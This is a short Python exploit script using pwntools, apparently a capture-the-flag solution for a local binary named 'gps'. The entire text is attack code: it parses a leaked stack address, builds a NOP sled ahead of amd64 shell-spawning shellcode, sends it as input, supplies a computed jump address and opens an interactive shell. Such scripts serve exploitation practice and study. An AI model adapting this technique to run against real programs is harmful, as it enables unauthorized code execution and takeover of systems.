from pwn import *
context.binary = "./gps"
p = process("./gps")

p.recvuntil("Current position: ")
stack = eval(p.recvuntil("\n" , drop = True))  + 0x29c 
log.info("stack : " + hex(stack))

target = stack + 0x520
shellcode = asm(shellcraft.amd64.linux.sh())
# make shellcode randomization-resistant by nop
nop = "\x90"
shellcode = nop * (0x1000 - len(shellcode) - 1) + shellcode # -1 for \n 
p.sendlineafter("What's your plan?\n> " , shellcode)
p.sendlineafter("Where do we start?\n> " , hex(target)[2:])

p.interactive()
